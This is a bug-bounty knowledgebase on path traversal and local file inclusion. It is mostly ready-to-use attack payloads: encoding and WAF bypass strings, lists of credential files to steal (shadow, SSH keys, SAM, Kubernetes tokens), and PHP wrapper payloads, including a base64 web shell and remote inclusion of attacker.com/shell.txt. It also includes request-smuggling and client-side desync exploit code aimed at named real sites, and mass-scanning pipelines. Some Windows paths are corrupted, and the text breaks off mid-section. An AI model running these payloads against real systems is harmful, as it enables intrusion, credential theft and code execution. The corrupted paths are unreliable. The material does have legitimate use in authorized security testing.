# Path Traversal / Directory Traversal / LFI Knowledgebase

> **Research-grade knowledgebase for advanced bug bounty hunting and black-box testing**
> 
> Compiled from: PortSwigger Research, PayloadsAllTheThings, HackTricks, OWASP, ProjectDiscovery Nuclei Templates, SecLists, and numerous bug bounty writeups.

---

## Table of Contents

1. [Basics](#basics)
2. [Path Traversal Theory](#path-traversal-theory)
3. [Filesystem Internals](#filesystem-internals)
4. [Directory Traversal Payloads](#directory-traversal-payloads)
5. [LFI Payloads](#lfi-payloads)
6. [File Inclusion Techniques](#file-inclusion-techniques)
7. [Null Byte Bypasses](#null-byte-bypasses)
8. [URL Encoding Bypasses](#url-encoding-bypasses)
9. [Double URL Encoding Bypasses](#double-url-encoding-bypasses)
10. [Path Normalization Bypasses](#path-normalization-bypasses)
11. [Absolute Path Bypasses](#absolute-path-bypasses)
12. [Archive Extraction Traversal](#archive-extraction-traversal)
13. [Request Smuggling + Traversal Chains](#request-smuggling--traversal-chains)
14. [Cache Poisoning + Traversal Chains](#cache-poisoning--traversal-chains)
15. [OAuth + Traversal Chains](#oauth--traversal-chains)
16. [SSRF + Traversal Chains](#ssrf--traversal-chains)
17. [Parser Confusion Payloads](#parser-confusion-payloads)
18. [Browser Quirks](#browser-quirks)
19. [Gadget Chains](#gadget-chains)
20. [Real World Case Studies](#real-world-case-studies)
21. [Fuzzing Payloads](#fuzzing-payloads)
22. [Automation Workflows](#automation-workflows)
23. [Recon Methodology](#recon-methodology)
24. [Nuclei Templates](#nuclei-templates)
25. [Tools and Scanners](#tools-and-scanners)
26. [Advanced Research](#advanced-research)
27. [Bug Bounty Writeups](#bug-bounty-writeups)
28. [Payload Collections](#payload-collections)
29. [WAF Bypasses](#waf-bypasses)
30. [Detection Techniques](#detection-techniques)
31. [References](#references)

---

## Basics

### What is Path Traversal?

Path traversal (also known as directory traversal) is a security vulnerability that allows an attacker to read arbitrary files on the server by manipulating variables that reference files with "dot-dot-slash (`../`)" sequences or similar constructs.

**Core Impact:**
- Read application code and data
- Access credentials for back-end systems
- Retrieve sensitive operating system files
- In some cases, write to arbitrary files leading to RCE

### Basic Example

A shopping application displays images using:
```html
<img src="/loadImage?filename=218.png">
```

The server constructs the path:
```
/var/www/images/218.png
```

An attacker requests:
```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

The server reads:
```
/var/www/images/../../../etc/passwd → /etc/passwd
```

### Windows vs Unix

**Unix/Linux:**
- Root directory: `/`
- Directory separator: `/`
- Can navigate the entire filesystem

**Windows:**
- Root directory: `C:\` (or other drive letters)
- Directory separators: `/` or `\`
- Windows allows extra `.` `\` `/` characters at the end of filenames
- Can only navigate within the same partition as the web root (unless UNC paths are used)

---

## Path Traversal Theory

### Path Resolution Mechanics

When an application receives user input for a file path, it typically:
1. Concatenates a base directory with user input
2. Passes the result to a filesystem API
3. The OS resolves the path, processing `..` sequences

**Vulnerability occurs when:**
- User input is not validated before concatenation
- Canonicalization happens AFTER validation
- Path normalization is inconsistent between components

### Canonicalization vs Validation

**Canonicalization** (normalization) resolves `..`, `.`, symbolic links, and relative paths to an absolute path.

**Dangerous pattern:**
```java
// VULNERABLE: validates BEFORE canonicalization
if (userInput.contains("../")) { reject(); }
File file = new File(BASE_DIR, userInput);  // ../ still works via encoding
```

**Safe pattern:**
```java
// SECURE: canonicalizes THEN validates
File file = new File(BASE_DIR, userInput);
String canonicalPath = file.getCanonicalPath();
if (!canonicalPath.startsWith(BASE_DIR)) { reject(); }
```

### Defense Layers

1. **Avoid passing user input to filesystem APIs** (best defense)
2. **Whitelist validation** - compare against permitted values
3. **Canonical path verification** - ensure resolved path stays within base directory
4. **chroot jails** - restrict filesystem access
5. **Code access policies** - limit file operations

---

## Filesystem Internals

### Linux Sensitive Files

**Operating System & Information:**
```
/etc/issue
/etc/group
/etc/hosts
/etc/motd
/etc/passwd
/etc/shadow
```

**Process Information:**
```
/proc/[0-9]*/fd/[0-9]*    # PID + file descriptor
/proc/self/environ         # Current process environment
/proc/version              # Kernel version
/proc/cmdline              # Kernel boot parameters
/proc/sched_debug          # Scheduler debug info
/proc/mounts               # Mounted filesystems
/proc/self/cwd/index.php   # Current working directory files
/proc/self/cwd/main.py
```

**Network Information:**
```
/proc/net/arp
/proc/net/route
/proc/net/tcp
/proc/net/udp
```

**Credentials & History:**
```
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/etc/mysql/my.cnf
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
```

**Kubernetes:**
```
/run/secrets/kubernetes.io/serviceaccount/token
/run/secrets/kubernetes.io/serviceaccount/namespace
/run/secrets/kubernetes.io/serviceaccount/certificate
/var/run/secrets/kubernetes.io/serviceaccount
```

**Indexing Databases:**
```
/var/lib/mlocate/mlocate.db
/var/lib/plocate/plocate.db
/var/lib/mlocate.db
```

### Windows Sensitive Files

**Universal test files (always present):**
```
C:\Windows\win.ini
C:\windows\system32\license.rtf
```

**IIS / ASP.NET:**
```
c:/inetpub/logs/logfiles
c:/inetpub/wwwroot/global.asa
c:/inetpub/wwwroot/index.asp
c:/inetpub/wwwroot/web.config
c:/system32/inetsrv/metabase.xml
```

**System Files:**
```
c:/windows/repair/sam
c:/windows/repair/system
c:/sysprep.inf
c:/sysprep.xml
c:/sysprep/sysprep.inf
c:/sysprep/sysprep.xml
c:/unattend.txt
c:/unattend.xml
c:/unattended.txt
c:/unattended.xml
c:/system volume information/wpsettings.dat
```

---

## Directory Traversal Payloads

### Basic Traversal Sequences

```
../
..\
..\/
```

### Standard Encoded Variants

```
%2e%2e%2f        # URL encoded ../
%2e%2e/         # Mixed encoding
..%2f           # Partial encoding
%2e%2e%5c        # URL encoded ..\
%2e%2e\        # Mixed encoding
..%5c           # Partial encoding
```

### Unicode / UTF-8 Variants

```
%c0%ae%c0%ae%c0%af     # Overlong UTF-8 for ../
%uff0e%uff0e%u2215     # Unicode encoding ../
%uff0e%uff0e%u2216     # Unicode encoding ..\
%c0%ae               # Overlong UTF-8 for .
%c0%af               # Overlong UTF-8 for /
%c0%5c               # Overlong UTF-8 for \
%e0%40%ae            # Overlong UTF-8 variant for .
%e0%80%af            # Overlong UTF-8 variant for /
```

### Double Encoding Variants

```
%252e%252e%252f      # Double URL encoded ../
%252e%252e%255c      # Double URL encoded ..\
```

### Mangled Path (WAF Bypass)

When WAFs strip `../` non-recursively:

```
..././              # After stripping ../ → ../
...\.\             # Windows variant
....//              # After stripping ../ → ../
....\              # Windows variant
```

### Nginx + Tomcat Path Confusion

```
..;/                # Nginx treats as dir, Tomcat treats as ../
```

### UNC Share Injection (Windows)

```
\\localhost\c$\windows\win.ini
\\attacker.com\share\file.txt    # May trigger NTLM authentication
```

### Java URL Protocol

```
url:file:///etc/passwd
url:http://127.0.0.1:8080
```

### ASP.NET Cookieless Session Bypass

```
/(S(X))/admin/(S(X))/main.aspx
/(S(x))/b/(S(x))in/Navigator.dll
/(Y(Z))/
/(G(AAA-BBB)D(CCC=DDD)E(0-1))/
```

---

## LFI Payloads

### PHP LFI Basics

```php
?page=../../../etc/passwd
?page=../../../../../../etc/passwd
?page=....//....//....//etc/passwd
?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### PHP Filter Chains (LFI to RCE)

**Base64 filter chain:**
```php
php://filter/convert.base64-encode/resource=index.php
php://filter/read=convert.base64-encode/resource=../../../etc/passwd
```

**String filter chain for RCE:**
```php
php://filter/convert.iconv.UTF-8.UTF-7/resource=php://temp
```

### PHP Wrapper Exploitation

```php
expect://id                    # Requires expect extension
input://<?php system('id'); ?> # Requires allow_url_include=On
php://input                    # POST data as file contents
php://filter/convert.base64-decode/resource=data://plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
```

### Nginx Temp File LFI to RCE

When PHP file uploads create temp files in `/var/lib/nginx/tmp/`:
```
?file=/var/lib/nginx/tmp/client_body/0000000001
```

### PHP Session Upload Progress (LFI to RCE)

Requires `session.upload_progress.enabled = On`:
```
?file=/var/lib/php/sessions/sess_<sessionid>
```

### Segmentation Fault Technique

Using PHP filter chains to cause segfault and dump memory:
```php
php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```

---

## File Inclusion Techniques

### Remote File Inclusion (RFI)

```php
?page=http://attacker.com/shell.txt
?page=http://attacker.com/shell.txt%00
?page=ftp://attacker.com/shell.txt
```

### Data URI Scheme

```php
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
?page=data://application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

### Phar Deserialization

```php
phar://uploaded.zip/test.txt    # Triggers deserialization via phar wrapper
```

### Compress Wrappers

```php
compress.zlib:///etc/passwd
compress.bzip2:///etc/passwd
```

---

## Null Byte Bypasses

### Theory

Null bytes (`%00`, `0x00`) act as string terminators in C/C++ and some higher-level languages. When validation checks for file extensions but the underlying OS uses null-terminated strings:

```
filename=../../../etc/passwd%00.png
```

**Application sees:** `../../../etc/passwd%00.png` (ends with .png)
**OS sees:** `../../../etc/passwd` (terminated at null byte)

### Payloads

```
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png
../../../etc/passwd%00.txt
../../../etc/passwd%00.html
```

### Real-World Examples

**Homematic CCU3 (CVE-2019-9726):**
```
{{BaseURL}}/.%00./.%00./etc/passwd
```

**Kyocera Printer d-COPIA253MF (CVE-2020-23575):**
```
{{BaseURL}}/wlmeng/../../../../../../../../../../../etc/passwd%00index.htm
```

### Limitations

- PHP 5.3.4+ patched null byte injection in file system functions
- Still works in some native extensions and older systems
- Java applications may still be vulnerable

---

## URL Encoding Bypasses

### Single Encoding Table

| Character | Encoded |
|-----------|---------|
| `.`       | `%2e`   |
| `/`       | `%2f`   |
| `\`      | `%5c`   |
| `:`       | `%3a`   |

### Example Payloads

```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

**IPConfigure Orchid Core VMS 2.0.5:**
```
{{BaseURL}}/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd
```

---

## Double URL Encoding Bypasses

### Theory

Some systems decode input twice:
1. Web server decodes once
2. Application/framework decodes again

### Encoding Table

| Character | Double Encoded |
|-----------|----------------|
| `.`       | `%252e`        |
| `/`       | `%252f`        |
| `\`      | `%255c`        |

### Example Payloads

```
%252e%252e%252f%252e%252e%252fetc%252fpasswd
%252e%252e%255c%252e%252e%255cwindows%255cwin.ini
```

**Spring MVC Directory Traversal (CVE-2018-1271):**
```
{{BaseURL}}/static/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
{{BaseURL}}/spring-mvc-showcase/resources/%255c%255c..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/..%255c/windows/win.ini
```

---

## Path Normalization Bypasses

### Non-Recursive Stripping

When filters remove `../` but don't iterate:

```
....//....//....//etc/passwd    # After strip: ../../../etc/passwd
....\....\....\etc/passwd   # Windows variant
```

### Path Injection with Valid Prefix

When application requires path to start with expected base folder:

```
filename=/var/www/images/../../../etc/passwd
filename=/var/www/images/..%2f..%2f..%2fetc%2fpasswd
```

### IIS Short Name (8.3 Format)

Windows stores short names for compatibility:
```
/bin::$INDEX_ALLOCATION/
/MyApp/bin::$INDEX_ALLOCATION/
```

**Scanner commands:**
```bash
java -jar ./iis_shortname_scanner.jar 20 8 'https://X.X.X.X/bin::$INDEX_ALLOCATION/'
shortscan http://example.org/
```

---

## Absolute Path Bypasses

### Direct Absolute Path

When traversal sequences are blocked but absolute paths work:

```
filename=/etc/passwd
filename=/var/www/html/config.php
filename=C:\windows\win.ini
```

### Null Byte with Absolute Path

```
filename=/etc/passwd%00.jpg
```

### UNC Absolute Paths

```
\\server\share\file.txt
\\127.0.0.1\c$\windows\win.ini
```

---

## Archive Extraction Traversal

### ZIP Traversal

Malicious ZIP entries with `../` in filenames:
```
../evil.php
../../evil.php
../../../var/www/html/evil.php
```

### Tar Traversal

```bash
tar -cf exploit.tar ../../../../../var/www/html/shell.php
```

### 7z / RAR Traversal

Same principle - archive extractors that don't validate entry paths.

### Detection

1. Upload archive with traversal paths
2. Check if files appear outside extraction directory
3. Common in import/export features, backup restore, theme uploads

---

## Request Smuggling + Traversal Chains

### CL.TE Desync (Content-Length vs Transfer-Encoding)

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 53
Transfer-Encoding: chunked

17
=x&q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: b
```

### TE.CL Desync

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

96
GET /404 HTTP/1.1
X: x=1&q=smuggling&x=
Host: target.com
Content-Length: 100

x=
0

POST /search HTTP/1.1
Host: target.com
```

### H2.CL / H2.TE (HTTP/2 Downgrade)

HTTP/2 front-end adds `Transfer-Encoding: chunked` during downgrade:
```
:method POST
:path /
:authority target.com

0
malicious-prefix
```

### CL.0 Desync (Browser-Powered)

Back-end ignores Content-Length:
```http
POST /static/file HTTP/1.1
Host: target.com
Content-Length: 30

GET /admin HTTP/1.1
X: Y
```

### Pause-Based Desync

Send headers, wait for timeout, send body as new request:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 100

[PAUSE 15+ seconds]

GET /admin HTTP/1.1
Host: target.com
```

### Chaining with Path Traversal

Use smuggled requests to reach internal endpoints:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 60
Transfer-Encoding: chunked

0

GET /../internal/admin HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
```

---

## Cache Poisoning + Traversal Chains

### Cache Key Basics

Cache key typically includes: `method + host + path + query_string`

Unkeyed inputs: headers, cookies, body (usually)

### Unkeyed Header Poisoning

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# Response reflects attacker.com in URLs
# Cache saves this, serves to other users
```

### Cache Parameter Cloaking

Exploit URL parsing differences between cache and application:
```
/search?q=help?_=payload&!&search=1
# Cache sees: q=help (stops at &_)
# App sees: q=help?_=payload, !, search=1
```

### Fat GET Poisoning

GET with body that isn't in cache key:
```http
GET /contact/report-abuse?report=albinowax HTTP/1.1
Host: github.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

report=innocent-victim
```

### Path Normalization Poisoning

```
Apache: //
Nginx: /%2F
PHP: /index.php/xyz
.NET: /(A(xyz))/
```

### Web Cache Entanglement

Cache normalizes path differently than backend:
```
GET /%3fproduct=firefox HTTP/1.1
Host: download.mozilla.org

# Cache key: /?product=firefox (decoded)
# Backend: broken redirect
```

---

## OAuth + Traversal Chains

### Dynamic Client Registration SSRF

OAuth registration endpoint accepts URL parameters:
```json
POST /connect/register HTTP/1.1
Content-Type: application/json

{
  "redirect_uris": ["https://client.example.org/callback"],
  "logo_uri": "http://attacker.com/xss.html",
  "jwks_uri": "http://attacker.com/keys.jwks",
  "sector_identifier_uri": "http://attacker.com/uris.json",
  "request_uris": ["http://attacker.com/request.jwt"]
}
```

### redirect_uri Session Poisoning

Race condition in session-stored OAuth parameters:
1. User visits attacker page
2. Page redirects to OAuth with trusted client_id
3. Background request poisons session with malicious redirect_uri
4. User approves, gets redirected to attacker

### request_uri SSRF

```
GET /authorize?response_type=code&id_token&client_id=sclient1&request_uri=https://attacker.com/request.jwt
```

### WebFinger User Enumeration

```
GET /.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer
```

---

## SSRF + Traversal Chains

### URL Parser Confusion

Different URL parsers handle URLs differently:
```
http://127.0.0.1:80@evil.com/
http://127.0.0.1%00.evil.com/
http://127.0.0.1?.evil.com/
http://127.0.0.1#.evil.com/
```

### IPv6 / IPv4 Embedding

```
http://[::ffff:127.0.0.1]/
http://0x7f.0x00.0x00.0x01/
http://0177.0.0.1/
http://2130706433/           # 127.0.0.1 as decimal
```

### DNS Rebinding

1. Register domain with short TTL
2. First request resolves to allowed IP
3. Second request resolves to internal IP
4. Bypasses IP-based SSRF filters

### IDNA Homograph

```
http://127。0。0。1/          # Fullwidth dots
http://⑫⑦。⓪。⓪。①/          # Circled digits
```

---

## Parser Confusion Payloads

### URL Parser Differences

| URL | cURL sees | Browser sees |
|-----|-----------|--------------|
| `http://evil.com:80@good.com/` | evil.com:80@good.com | good.com |
| `http://good.com@evil.com/` | good.com@evil.com | evil.com |
| `http://good.com%2F@evil.com/` | good.com/@evil.com | evil.com |

### Path Parser Confusion

```
/path/..;/admin          # Some parsers: /admin, Others: /path/..;/admin
/path/%2e%2e;/admin      # Similar confusion
```

### JSON Parser Confusion

```json
{"path": "../../../etc/passwd\u0000.jpg"}
{"path": "..\u002f..\u002fetc\u002fpasswd"}
```

---

## Browser Quirks

### Chrome / Chromium

- Strips `..` from URL paths before sending (in address bar)
- `fetch()` with `mode: 'no-cors'` shows connection ID
- Two connection pools: with-cookies and without-cookies
- Prefers HTTP/2, making CSD attacks harder

### Firefox

- More permissive with URL encoding
- SHIELD system fetches recipes (exploitable via X-Forwarded-Host)

### Safari

- Auto-upgrades HTTP to HTTPS if in HSTS cache
- Mixed-content protection bypassable with 302 to HTTPS

### Internet Explorer / Edge Legacy

- Mixed-content protection completely bypassable
- 302 redirect to HTTPS bypasses mixed-content protection

### Client-Side Desync (CSD)

```javascript
fetch('https://example.com/assets', {
    method: 'POST',
    body: "GET /robots.txt HTTP/1.1\r\nX: Y",
    mode: 'no-cors',
    credentials: 'include'
}).then(() => {
    location = 'https://example.com/'
})
```

---

## Gadget Chains

### Client-Side Prototype Pollution Gadgets

**jQuery:**
```
?__proto__[innerHTML]=<img/src/onerror%3dalert(1)>
?__proto__[context]=<img/src/onerror%3dalert(1)>&__proto__[jquery]=x
?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script
```

**Vue.js:**
```
?__proto__[v-if]=_c.constructor('alert(1)')()
?__proto__[template]=<script>alert(1)</script>
?__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script
```

**Google Analytics:**
```
?__proto__[cookieName]=COOKIE%3DInjection%3B
```

**Lodash:**
```
?__proto__[sourceURL]=%E2%80%A8%E2%80%A9alert(1)
```

### postMessage Gadgets

Use postMessage-tracker Chrome extension to find vulnerable listeners.

### PHP Gadget Chains

**Laravel:**
```php
phar://uploaded.phar   # Triggers deserialization
```

**Symfony:**
```php
/phpunit/phpunit/src/Util/PHP/eval-stdin.php   # RCE gadget
```

---

## Real World Case Studies

### Case 1: PortSwigger Labs

**Lab 1 - Simple Case:**
```
GET /image?filename=../../../etc/passwd HTTP/1.1
```

**Lab 2 - Absolute Path Bypass:**
```
GET /image?filename=/etc/passwd HTTP/1.1
```

**Lab 3 - Non-Recursive Stripping:**
```
GET /image?filename=....//....//....//etc/passwd HTTP/1.1
```

**Lab 4 - Superfluous URL Decode:**
```
GET /image?filename=%252e%252e%252fetc%252fpasswd HTTP/1.1
```

**Lab 5 - Validation of Start of Path:**
```
GET /image?filename=/var/www/images/../../../etc/passwd HTTP/1.1
```

**Lab 6 - Null Byte Bypass:**
```
GET /image?filename=../../../etc/passwd%00.png HTTP/1.1
```

### Case 2: Yahoo Traffic Server ($15,000)

Invalid Host header + path normalization:
```http
GET / HTTP/1.1
Host: ../?x=.vcap.me
```

Result: Backend request to `outage.vcap.me/?x=whatever` (127.0.0.1)

### Case 3: New Relic Routing Bug

Apache HttpComponents didn't require paths to start with `/`:
```http
GET @burp-collaborator.net/ HTTP/1.1
Host: newrelic.com
```

### Case 4: Amazon CL.0 Desync

Amazon `/b/` endpoint ignored Content-Length:
```http
POST /b/ HTTP/2
Host: www.amazon.com
Content-Length: 23

GET /404 HTTP/1.1
X: XGET / HTTP/1.1
Host: www.amazon.com
```

### Case 5: Akamai CSD ($5,000)

POST to redirect endpoint ignores CL:
```javascript
fetch('https://www.capitalone.ca/assets', {
    method: 'POST',
    body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
    credentials: 'include',
    mode: 'cors'
}).catch(() => {
    location = 'https://www.capitalone.ca/'
})
```

### Case 6: Cisco Web VPN CSD

Client-side cache poisoning:
```javascript
fetch('https://redacted/', {
    method: 'POST', 
    body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y", 
    credentials: 'include'
}).catch(() => { 
    location='https://redacted/+CSCOE+/win.js' 
})
```

### Case 7: PayPal Login Page ($X,XXX)

Request smuggling + cache poisoning + CSP bypass:
1. Smuggle request to poison JS file in cache
2. CSP on main page blocks script execution
3. iframe sub-page has no CSP, imports poisoned JS
4. Redirect iframe to page without CSP
5. Access parent, steal password

---

## Fuzzing Payloads

### Comprehensive Payload List

```
../
..\
..\/
%2e%2e%2f
%2e%2e/
..%2f
%2e%2e%5c
%2e%2e\
..%5c
%252e%252e%252f
%252e%252e%255c
..%255c
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
....//
....\
..;/
%2e%2e%3b/
%2e%2e%3b%2f
\localhost\c$\windows\win.ini
\\localhost\c$\windows\win.ini
url:file:///etc/passwd
/(S(X))/
/(Y(Z))/
```

### Burp Intruder Payload List

Use Burp's predefined **Fuzzing - path traversal** list for automated testing.

### dotdotpwn Fuzzer

```bash
perl dotdotpwn.pl -h 10.10.10.10 -m http -t 300 -f /etc/passwd -s -q -b
```

---

## Automation Workflows

### Recon Pipeline

```bash
# 1. Subdomain enumeration
subfinder -d target.com -o subs.txt

# 2. Probe for live hosts
httpx -l subs.txt -o live.txt

# 3. Crawl for parameters
katana -list live.txt -o urls.txt

# 4. Fuzz for path traversal
nuclei -l live.txt -t http/vulnerabilities/path-traversal/

# 5. Check for request smuggling
python smuggler.py -u https://target.com

# 6. Check for cache poisoning
# Use Param Miner in Burp Suite
```

### Nuclei Scanning Workflow

```bash
# Basic path traversal scan
nuclei -u https://target.com -t http/vulnerabilities/path-traversal/

# Full vulnerability scan
nuclei -u https://target.com -t http/vulnerabilities/

# With custom templates
nuclei -u https://target.com -t custom-templates/
```

### Mass Scanning Pipeline (Cracking the Lens style)

```bash
# 1. Build target list from bug bounty programs
# 2. Map against Project Sonar Forward DNS database
# 3. Filter to web servers (port 80/443)
# 4. Send payloads with unique identifiers
# 5. Correlate pingbacks with Burp Collaborator
```

---

## Recon Methodology

### Step 1: Identify File Loading Endpoints

Look for parameters like:
```
?file=
?page=
?path=
?dir=
?document=
?resource=
?template=
?include=
?load=
?read=
?download=
?attachment=
```

### Step 2: Test for Path Traversal

1. Send basic `../` payload
2. Check for error messages revealing path structure
3. Try encoded variants
4. Test absolute paths
5. Test null byte bypasses

### Step 3: Identify Technology Stack

- Server headers (Server, X-Powered-By)
- File extensions in responses
- Error page analysis
- WAF detection (blocked response patterns)

### Step 4: Technology-Specific Testing

**PHP:** Test `php://filter`, `php://input`, `data://`, `expect://`
**Java:** Test `file://`, `url:`, `jar://`
**.NET:** Test cookieless session bypass, IIS short names
**Nginx + Tomcat:** Test `..;/` confusion

### Step 5: Chain with Other Vulnerabilities

- Request smuggling for internal access
- Cache poisoning for mass exploitation
- SSRF for internal file access
- Prototype pollution for DOM-based gadgets

---

## Nuclei Templates

### Template Structure

```yaml
id: path-traversal-example
info:
  name: Path Traversal Example
  author: yourname
  severity: high
  description: Detects path traversal vulnerability

requests:
  - method: GET
    path:
      - "{{BaseURL}}/image?filename=../../../etc/passwd"
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
```

### Key Templates from ProjectDiscovery

```
http/vulnerabilities/path-traversal/
├── generic-lfi.yaml
├── generic-traversal.yaml
├── linux-lfi-fuzzing.yaml
├── windows-lfi-fuzzing.yaml
├── apache-path-traversal.yaml
├── nginx-off-by-slash.yaml
├── spring-mvc-traversal.yaml
└── ...
```

### Custom Template Example

```yaml
id: custom-path-traversal
info:
  name: Custom Path Traversal
  author: researcher
  severity: critical

requests:
  - method: GET
    path:
      - "{{BaseURL}}/api/download?file=..%2f..%2f..%2fetc%2fpasswd"
      - "{{BaseURL}}/api/download?file=..%252f..%252f..%252fetc%252fpasswd"
    matchers-condition: or
    matchers:
      - type: regex
        regex:
          - "root:.*:0:0:"
        part: body
      - type: status
        status:
          - 200
```

---

## Tools and Scanners

### Path Traversal Specific

| Tool | Purpose | Command |
|------|---------|---------|
| dotdotpwn | Directory traversal fuzzer | `perl dotdotpwn.pl -h target -m http` |
| shortscan | IIS short name scanner | `shortscan http://target/` |
| IIS-ShortName-Scanner | IIS 8.3 enumeration | `java -jar iis_shortname_scanner.jar` |

### General Web Scanning

| Tool | Purpose |
|------|---------|
| nuclei | Vulnerability scanner |
| httpx | Fast HTTP prober |
| katana | Web crawler |
| subfinder | Subdomain discovery |
| interactsh | OOB interaction server |
| naabu | Port scanner |

### Request Smuggling

| Tool | Purpose | Command |
|------|---------|---------|
| HTTP Request Smuggler | Burp extension for smuggling | Install via BApp Store |
| smuggler | Python smuggling scanner | `python smuggler.py -u URL` |
| Turbo Intruder | Fast HTTP attacker | Custom scripts |

### Cache Poisoning

| Tool | Purpose |
|------|---------|
| Param Miner | Hidden parameter discovery |
| Collaborator Everywhere | Backend system detection |

### Browser Analysis

| Tool | Purpose |
|------|---------|
| postMessage-tracker | postMessage listener tracking |
| pp-finder | Prototype pollution gadget finder |
| Rendering Engine Hackability Probe | Client fingerprinting |

---

## Advanced Research

### James Kettle's Research (PortSwigger)

1. **HTTP Desync Attacks (2019)** - Request smuggling reborn
2. **Browser-Powered Desync (2022)** - Client-side desync attacks
3. **Web Cache Entanglement (2020)** - Novel cache poisoning pathways
4. **Practical Web Cache Poisoning (2018)** - Cache poisoning methodology
5. **Cracking the Lens (2017)** - Targeting HTTP's hidden attack surface
6. **Hidden OAuth Attack Vectors (2021)** - OAuth SSRF and session poisoning

### Key Research Findings

- **CL.0 / H2.0 desync**: Back-end ignores Content-Length completely
- **Pause-based desync**: Timeout-based request splitting
- **First-request routing**: Front-end routes by first request's Host
- **Cache parameter cloaking**: Hide params from cache via parsing quirks
- **Fat GET**: GET with body not in cache key

### Emerging Attack Vectors

- **HTTP/2 Continuation floods** - DoS via HEADERS frames
- **QUIC desync** - HTTP/3 request smuggling
- **GraphQL batching** - Multiple operations in single request
- **WebSocket smuggling** - Upgrade header confusion

---

## Bug Bounty Writeups

### High-Impact Findings

**Yahoo Traffic Server ($15,000)**
- Technique: Invalid Host header + path normalization
- Impact: Internal admin access, configuration modification

**Amazon CL.0 ($X,XXX)**
- Technique: Browser-powered desync on `/b/` endpoint
- Impact: Request hijacking, potential desync worm

**PayPal Login ($X,XXX)**
- Technique: Request smuggling + cache poisoning + CSP bypass chain
- Impact: Password theft for all Safari/IE users

**Akamai CSD ($5,000)**
- Technique: Client-side desync via POST to redirect endpoint
- Impact: XSS on all Akamai-hosted sites

**New Relic Routing ($0 - swag)**
- Technique: `@` in path bypasses URI validation
- Impact: Internal network access

**GitHub Fat GET ($10,000)**
- Technique: GET with body not in cache key
- Impact: Cache poisoning, arbitrary parameter manipulation

**Mozilla SHIELD ($1,000)**
- Technique: X-Forwarded-Host poisoning
- Impact: Mass browser recipe hijacking

### Common Patterns in Writeups

1. **Multi-step chains** - Simple vulns become critical via chaining
2. **Parser confusion** - Different components parse same input differently
3. **Race conditions** - Timing-dependent exploitation
4. **Browser quirks** - Leveraging browser-specific behaviors
5. **Infrastructure targeting** - Attacking load balancers, CDNs, proxies

---

## Payload Collections

### Linux File Targets

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/etc/group
/etc/mysql/my.cnf
/etc/nginx/nginx.conf
/etc/apache2/apache2.conf
/etc/redis/redis.conf
/etc/ssh/sshd_config
/home/$USER/.bash_history
/home/$USER/.ssh/id_rsa
/home/$USER/.ssh/authorized_keys
/root/.bash_history
/root/.ssh/id_rsa
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/www/html/config.php
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/index.php
/proc/version
/proc/net/tcp
```

### Windows File Targets

```
C:\Windows\win.ini
C:\Windows\System32\license.rtf
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\global.asa
C:\inetpub\logs\logfiles
C:\Windowsepair\sam
C:\Windowsepair\system
C:\Windows\System32\config\SAM
C:\Windows\System32\drivers\etc\hosts
C:\ProgramData\Microsoft\Wlansvc\Profiles\Interfaces```

### Universal Test Payloads

```
../../../etc/passwd
..\..\..\windows\win.ini
/etc/passwd
C:\Windows\win.ini
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
....//....//....//etc/passwd
..;/..;/..;/etc/passwd
\\localhost\c$\windows\win.ini
```

---

## WAF Bypasses

### Common WAF Filters and Bypasses

**Filter: Blocks `../`**
```
Bypass: %2e%2e%2f, ..%2f, %c0%ae%c0%ae%c0%af
```

**Filter: Blocks `%`**
```
Bypass: ..;/, ....//, Unicode variants
```

**Filter: Strips `../` (non-recursive)**
```
Bypass: ....//, ..././, ....\
```

**Filter: Requires file extension**
```
Bypass: ../../../etc/passwd%00.jpg
```

**Filter: Blocks absolute paths**
```
Bypass: Use traversal sequences from known base path
```

**Filter: URL decode once**
```
Bypass: Double URL encoding %252e%252e%252f
```

### Cloud-Specific WAFs

**Cloudflare:**
- Bypass via cache parameter cloaking
- Fat GET techniques

**AWS WAF:**
- H2.CL downgrade smuggling
- CL.0 desync

**Akamai:**
